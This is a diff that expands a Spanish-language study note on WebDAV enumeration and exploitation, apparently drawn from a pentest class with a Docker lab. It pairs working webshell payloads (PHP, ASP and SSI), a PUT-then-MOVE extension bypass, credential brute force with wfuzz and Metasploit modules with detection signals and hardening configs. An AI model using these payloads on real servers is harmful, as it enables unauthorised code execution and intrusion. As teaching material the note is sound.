@@ -4,13 +4,94 @@ aliases:
   - Enumeración WebDAV
   - Explotación WebDAV
 tags:
-  - hacking/web
-  - hacking/herramientas
-  - hacking/explotacion
-  - hacking/laboratorios
-estado: 🟢 Terminado
+  - sec/web
+  - sec/web/dav
+tipo: concepto
+estado: terminado
+creado: 2026-10-11
+actualizado: 2026-10-11
+relacionado:
+  - "[[Abuso de Subida de Archivos]]"
+  - "[[Local File Inclusion]]"
+  - "[[Gestión de Autenticación]]"
+  - "[[Information disclosure]]"
+  - "[[WhatWeb Herramienta de Fingerprinting]]"
+fuente: "https://datatracker.ietf.org/doc/html/rfc4918"
 ---
-# WebDAV: Enumeración y Explotación
+
+# WebDAV — Enumeración y Explotación
+
+**WebDAV** (*Web Distributed Authoring and Versioning*, RFC 4918) es una extensión de HTTP que convierte un servidor web en un **sistema de archivos remoto colaborativo**: permite listar directorios, crear carpetas, subir, mover, bloquear y versionar recursos **usando verbos HTTP**. Cuando un servidor expone WebDAV sin autorización rigurosa, la enumeración y la explotación son directas: descubrís la estructura, probáis qué extensiones admite el `PUT` y, si el servidor las interpreta, subís una webshell (cadena clásica **PUT → RCE**, profundizada en [[Abuso de Subida de Archivos]]).
+
+## Mecánica: WebDAV sobre HTTP
+
+WebDAV **no es un protocolo aparte**: son verbos HTTP extra sobre el mismo puerto 80/443, con autenticación Basic/Digest habitual. El cliente (cadaver, Explorer de Windows, herramientas de pentest) habla directamente con el vhost.
+
+### Catálogo de métodos
+
+| Método | Función | Ejemplo de uso / abuso |
+|---|---|---|
+| `OPTIONS` | Enumera los métodos soportados (`DAV:`, `Allow:`) | Reconocimiento inicial: detectar WebDAV |
+| `PROPFIND` | Lista propiedades y estructura (`Depth: 0/1/infinity`) | Enumeración de directorios y metadatos |
+| `PROPPATCH` | Modifica propiedades de un recurso | Inyectar metadatos, evadir filtros por contenido |
+| `MKCOL` | Crea una colección (directorio) | Preparar ruta de subida |
+| `PUT` | Sube un archivo al servidor | **Vector principal**: subir webshell |
+| `GET` | Descarga (HTTP estándar) | Descargar archivos filtrados |
+| `DELETE` | Borra recursos | Destrucción / limpieza de rastros |
+| `COPY` | Copia un recurso (`Destination:`) | Copiar shell a extensión interpretable |
+| `MOVE` | Mueve/renombra (`Destination:`) | **Bypass de whitelist**: `shell.txt` → `shell.php` |
+| `LOCK`/`UNLOCK` | Bloquea/desbloquea recursos | Exclusión, DoS sobre archivos legítimos |
+| `REPORT`, `CHECKIN/OUT`, `VERSION-CONTROL` | Versionado (DeltaV) | Fuga de versiones previas de archivos |
+
+### Códigos de estado relevantes
+
+| Código | Significado | Lectura para el atacante |
+|---|---|---|
+| `200` / `207 Multi-Status` | PROPFIND OK / resultado XML multi-status | Tienes enumeración |
+| `201 Created` | PUT/MKCOL creó el recurso | Subida aceptada |
+| `401` | Falta autenticación | Hay auth: probar credenciales |
+| `403` | Autenticado pero sin permiso | Credencial válida o permiso insuficiente |
+| `405 Method Not Allowed` | Verb no habilitado | Mirar `Allow`: ahí está el menú |
+| `507 Insufficient Storage` | Sin espacio | El endpoint de subida existe |
+
+> [!tip] Detección inicial
+> `curl -X OPTIONS http://target/ -i` → cabeceras `DAV: 1,2` y `Allow: GET, POST, OPTIONS, TRACE, PUT, DELETE, PROPFIND...`. WhatWeb (ver [[WhatWeb Herramienta de Fingerprinting]]), Nikto y Nmap (`http-enum`, `http-put`, `http-dav`) lo detectan también. Si `OPTIONS` lista `PROPFIND`, tenés WebDAV confirmado aunque el `GET` pida login.
+
+## Metodología de enumeración y explotación
+
+1. **Descubrir**: WhatWeb/Nmap o `OPTIONS` directo. Identificar software (`Server:`, `X-Powered-By`, cabecera `DAV`).
+2. **Enumerar estructura**: `PROPFIND -H "Depth: 1" http://target/` — filtra nombres de carpetas y archivos; busca `web.config`, `.htaccess`, backups y directorios de uploads.
+3. **Probar autenticación**: sin credenciales primero (¿anónimous read/write?), luego credenciales por defecto (`admin:admin`, `administrator`, usuario del servicio) y, si procede, fuerza bruta acotada (ver [[Gestión de Autenticación]]).
+4. **Probar permisos de escritura**: `davtest` — sube y **ejecuta** archivos de prueba con ~30 extensiones (php, asp, aspx, jsp, cgi, shtml, txt, html...). La tabla resultado es tu plan de explotación.
+5. **Explotar RCE**: si la extensión interpretable está permitida, PUT de shell; si solo acepta extensiones "inofensivas", prueba `MOVE`/`COPY` para renombrar a `.php`/`.asp`, o bypasses (`.phtml`, `.php5`, `.phar`, `.shtml` con SSI, polyglot imagen).
+6. **A por la flag**: una vez RCE, escala según [[Local File Inclusion]] / subida de archivos, o lee directamente los archivos objetivo.
+
+### Cadena PUT → RCE
+
+| Escenario | Payload | Condición |
+|---|---|---|
+| PHP directo | `PUT /uploads/shell.php` con `<?php system($_GET['c']); ?>` | Apache ejecuta PHP en esa ruta |
+| Rename bypass | `PUT /uploads/shell.txt` → `MOVE` a `/uploads/shell.php` | MOVE habilitado y destino sin validar |
+| IIS | `PUT /uploads/shell.asp` (`<%eval request("c")%>`) | IIS con script maps |
+| SSI | `PUT /uploads/x.shtml` con `<!--#exec cmd="id" -->` | Includes del servidor habilitados |
+| Extensiones alternativas | `.phtml`, `.php3/4/5/7`, `.phar`, `.inc` | Mapeo activo del intérprete |
+| Polyglot imagen | `GIF89a<?php ...` en `shell.gif` | Si la ejecuta como PHP |
+
+## Herramientas
+
+| Herramienta | Uso | Flags / comandos clave |
+|---|---|---|
+| `davtest` | Prueba subida **y ejecución** por extensión | `davtest -url http://t -auth user:pass`, `-sendbd` (auto-PUT de shell), `-write`/`-read` |
+| `cadaver` | Cliente interactivo tipo FTP | `open http://t`, `ls`, `put f`, `get f`, `mkdir d`, `mv a b`, `propmod` |
+| `wfuzz` | Fuerza bruta de credenciales | `wfuzz -w rockyou.txt --hc 401 -H "Authorization: Basic Zm9vOmJhcg==" http://t/` |
+| Nmap scripts | Enumeración y abuso | `nmap -sV --script http-enum,http-put,http-dav target` |
+| Metasploit | Autopwn / explotación | `auxiliary/scanner/http/http_options`, `exploit/multi/http/dav_autopwn`, `exploit/windows/iis/iis_webdav_storage` (CVE-2017-7269) |
+| Burp Suite | PROPFIND/PUT manual + fuzzing | Repeater + Intruder sobre credenciales y rutas |
+
+## Base original de clase
+
+A continuación, los fundamentos y la práctica Docker originales de la nota:
+
 
 **WebDAV** (**Web Distributed Authoring and Versioning**) es una extensión del protocolo HTTP que permite a los usuarios **acceder** y **manipular** **archivos** en un servidor web a través de una conexión segura.
 
@@ -33,7 +114,7 @@ Otra de las herramientas que vemos en esta clase es **Cadaver**. Cadaver es otra
 
 Para prevenir la enumeración y explotación de WebDAV, es importante que los administradores de sistemas implementen medidas de seguridad adecuadas en el servidor. Esto puede incluir la limitación de los recursos disponibles en el servidor y la utilización de autenticación y autorización fuertes. Además, es importante que los usuarios protejan sus contraseñas y eviten el uso de contraseñas débiles o fáciles de adivinar.
 
-## Notas de Práctica
+### Notas de práctica — lab Docker (material original)
 
 Nos hemos montado con Docker un WebDAV para practicar y, al intentar verlo mediante el navegador, nos pide credenciales:
 
@@ -75,3 +156,109 @@ Ahora, para interactuar con la máquina ya teniendo la contraseña, podemos usar
 
 > [!tip] **Uso de `cadaver`**
 > `cadaver` proporciona una interfaz de línea de comandos similar a un cliente FTP para interactuar con servidores WebDAV. Permite operaciones como `ls` (listar), `get` (descargar), `put` (subir), `cd` (cambiar directorio), `mkdir` (crear directorio), entre otras. Es extremadamente útil para la gestión manual de archivos y la exploración del sistema de archivos del servidor WebDAV una vez que se ha obtenido acceso.
+## Detección (defensor)
+
+| Señal | Riesgo |
+|---|---|
+| Cabecera `DAV:` en respuestas a OPTIONS | WebDAV expuesto |
+| `Allow` incluye PUT/DELETE/PROPFIND accesibles anónimos | Escritura anónima directa |
+| `207` con listado completo a usuarios anónimos | Enumeración libre |
+| Archivos `.php/.asp/.aspx` en directorios de uploads | RCE inminente |
+| Usuario administrador sin 2FA + WebDAV autenticable | Fuerza bruta → RCE |
+| Log con ráfagas de `PROPFIND`/`PUT` fallidos | Exploración/ataque activo |
+
+## Impacto y riesgo
+
+- **RCE completo** vía PUT + intérprete (el techo del impacto web): webshell persistente, pivote interno.
+- Lectura/escritura/borrado arbitrario: exposición de código fuente, `.git`, configs y backups (conexión con [[Local File Inclusion]] y [[Information disclosure]]).
+- Backdoors persistentes y suplantación de archivos legítimos (`MOVE` sobre recursos existentes).
+
+## Defensa (con configuración)
+
+### 1. Deshabilitar WebDAV por completo (lo normal)
+
+```apache
+# Apache — denegar todo verb que no sea lectura básica
+<LimitExcept GET POST HEAD OPTIONS>
+    Require all denied
+</LimitExcept>
+# Con módulo DAV instalado:
+<IfModule mod_dav.c> DAVOff </IfModule>
+```
+
+```nginx
+# Nginx no trae WebDAV nativo (el módulo nginx-dav es de terceros): basta con no instalarlo
+# y bloquear verbos desconocidos:
+if ($request_method !~ ^(GET|HEAD|POST|OPTIONS)$) { return 405; }
+```
+
+```xml
+<!-- IIS — quitar el handler WebDAV y filtrar verbos en web.config -->
+<system.webServer>
+  <handlers>
+    <remove name="WebDAV" />
+  </handlers>
+  <security>
+    <requestFiltering>
+      <verbs allowUnlisted="false">
+        <add verb="GET" allowed="true" />
+        <add verb="POST" allowed="true" />
+      </verbs>
+    </requestFiltering>
+  </security>
+</system.webServer>
+```
+
+### 2. Si WebDAV es un requisito de negocio
+
+- Autenticación fuerte obligatoria (no Basic sobre HTTP plano; Digest como mínimo, ideal TLS + tokens) y cuentas dedicadas con permisos mínimos.
+- Escritura solo en directorios de uploads, con `PUT` limitado por extensión **y** por contenido (validación en la capa de la app, no solo en el verb).
+- Directorios de subida fuera del árbol servible y sin ejecución de intérpretes (ver [[Abuso de Subida de Archivos]]).
+- Auditoría y alertas sobre `PROPFIND`, `PUT`, `MOVE` y `DELETE` en los logs del proxy.
+
+## Errores comunes
+
+**Atacante:**
+1. Olvidar `OPTIONS`/`PROPFIND Depth` y concluir "no hay WebDAV" porque el GET pide login.
+2. Asumir que `405` en PUT significa "no escribo": el verb puede estar bloqueado pero `MOVE` o `COPY` abiertos.
+3. Fuerza bruta sin control: bloqueo de cuenta/IP (ver [[Gestión de Autenticación]]).
+4. Subir la shell sin verificar ejecución: `davtest` distingue *subido* de *ejecutado* — mira la columna "Exec".
+
+**Defensor:**
+1. Instalar el módulo DAV por defecto "por compatibilidad".
+2. Permitir `PUT` anónimo en `/uploads` sirviendo esa ruta con el intérprete activo.
+3. No registrar ni alertar sobre verbos DAV.
+4. Credenciales por defecto del servicio (`admin`/`admin`) sin rotar.
+
+## Cheatsheet
+
+```http
+OPTIONS / HTTP/1.1                          -> DAV:, Allow:
+PROPFIND / HTTP/1.1  Depth: 1               -> 207 Multi-Status con la estructura
+PUT /uploads/t.txt HTTP/1.1                 cuerpo: test
+MOVE /uploads/t.txt HTTP/1.1                Destination: /uploads/t.php
+```
+
+```bash
+davtest -url http://target -auth admin:password
+cadaver http://target            # ls / put / get / mv / mkdir
+wfuzz -w rockyou.txt --hc 401 -H "Authorization: Basic ..." http://target/
+nmap -sV --script http-enum,http-put,http-dav target
+msfconsole -q -x "use auxiliary/scanner/http/http_options; set RHOSTS target; run"
+```
+
+## Laboratorios y referencias
+
+- RFC 4918 (WebDAV): https://datatracker.ietf.org/doc/html/rfc4918
+- HackTricks — WebDAV pentesting: https://book.hacktricks.wiki/en/pentesting-web/webdav-protocol-pentesting.html
+- Davtest (Kali): https://www.kali.org/tools/davtest/
+- Cadaver: https://cadaver.uriap.com/
+- DVWA / imágenes Docker `byjokiko/webdav` o `makiso/webdav` para practicar (el lab de la clase)
+
+## Relacionadas
+
+- [[Abuso de Subida de Archivos]] — el PUT es, al final, una subida de archivos
+- [[Local File Inclusion]] — lectura de archivos tras obtener permiso de escritura/acceso
+- [[Gestión de Autenticación]] — la barrera entre "enumero" y "exploto"
+- [[Information disclosure]] — PROPFIND sin permisos es enumeración pura
+- [[WhatWeb Herramienta de Fingerprinting]] — fingerprinting inicial que detecta WebDAV
